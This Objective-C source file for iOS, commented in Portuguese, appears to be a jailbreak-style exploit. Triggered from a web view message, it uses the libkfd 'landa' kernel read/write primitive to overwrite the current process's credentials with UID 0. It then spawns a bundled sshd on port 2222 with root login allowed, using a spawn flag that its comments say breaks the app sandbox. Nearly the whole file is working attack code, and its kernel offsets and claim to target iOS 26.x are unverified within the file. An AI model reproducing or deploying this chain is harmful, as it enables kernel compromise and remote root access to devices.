#import <Foundation/Foundation.h>
#import <WebKit/WebKit.h>
#include <spawn.h>
#include <sys/wait.h>
#include "libkfd.h"

// Flags de sistema para iOS Moderno
#define POSIX_SPAWN_FOR_SANDBOX 0x4000 

@interface KernelBridge : NSObject <WKScriptMessageHandler>
@property (nonatomic, strong) WKWebView *webView;
@end

@implementation KernelBridge {
    u64 _kfd_ptr;
}

- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
        [self executeSshdExploit];
    }
}

- (void)log:(NSString *)msg {
    dispatch_async(dispatch_get_main_queue(), ^{
        [self.webView evaluateJavaScript:[NSString stringWithFormat:@"log('%@')", msg] completionHandler:nil];
    });
}

- (void)executeSshdExploit {
    [self log:@"🧪 Iniciando KFD (Landa Method)..."];

    // 1. ABRIR EXPLOIT
    // No iOS 26.x, o método 'puaf_landa' com 'kread_sem_open' é o mais resiliente
    _kfd_ptr = kopen(2048, puaf_landa, kread_sem_open, kwrite_sem_open);

    if (!_kfd_ptr) {
        [self log:@"❌ Falha: kopen retornou NULL (Exploit Bloqueado)."];
        return;
    }

    struct kfd* kfd = (struct kfd*)_kfd_ptr;
    [self log:@"✅ Exploit Ativo! Elevando privilégios..."];

    // 2. LOCALIZAR CREDENCIAIS VIA KFD STRUCT
    u64 proc_addr = kfd->info.kaddr.current_proc;
    u64 ucred_addr = 0;

    // Lendo o ponteiro de credenciais (Offset 0x100 para kernels 17.0+)
    kread(_kfd_ptr, proc_addr + 0x100, &ucred_addr, sizeof(ucred_addr));

    if (ucred_addr == 0) {
        [self log:@"❌ Erro: Não foi possível ler ucred."];
        kclose(_kfd_ptr);
        return;
    }

    // 3. PATCH DE ROOT (Escreve UID 0 nos campos cr_uid e cr_ruid)
    uint32_t root_id = 0;
    kwrite(_kfd_ptr, &root_id, ucred_addr + 0x18, sizeof(root_id)); // cr_uid
    kwrite(_kfd_ptr, &root_id, ucred_addr + 0x1c, sizeof(root_id)); // cr_ruid

    // 4. VERIFICAÇÃO FINAL E SPAWN
    if (getuid() == 0) {
        [self log:@"👑 <b>ROOT ATIVO!</b> Lançando SSHD..."];
        [self runSshdProcess];
    } else {
        [self log:@"❌ Erro: Patch aplicado mas UID permanece mobile."];
    }
}

- (void)runSshdProcess {
    pid_t pid;
    // O binário 'sshd' deve estar na raiz do seu projeto Xcode (Resources)
    NSString *binPath = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
    
    if (!binPath) {
        [self log:@"❌ Erro: Arquivo 'sshd' não encontrado no Bundle."];
        return;
    }

    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    
    // Flag 0x4000 quebra o sandbox do App para o processo filho
    posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETPGROUP | POSIX_SPAWN_FOR_SANDBOX);

    // Argumentos padrão para rodar como Root na porta 2222
    char *const ssh_args[] = {
        (char *)[binPath UTF8String],
        "-p", "2222",
        "-D", // Roda no foreground
        "-o", "PermitRootLogin=yes",
        "-o", "StrictModes=no",
        NULL
    };

    extern char **environ;
    int status = posix_spawn(&pid, [binPath UTF8String], NULL, &attr, ssh_args, environ);

    if (status == 0) {
        [self log:[NSString stringWithFormat:@"✅ SSHD Online! PID: %d porta 2222", pid]];
        [self log:@"💡 <i>ssh root@localhost -p 2222</i>"];
    } else {
        [self log:[NSString stringWithFormat:@"❌ Erro Spawn: %d (%s)", status, strerror(status)]];
    }

    posix_spawnattr_destroy(&attr);
}

@end
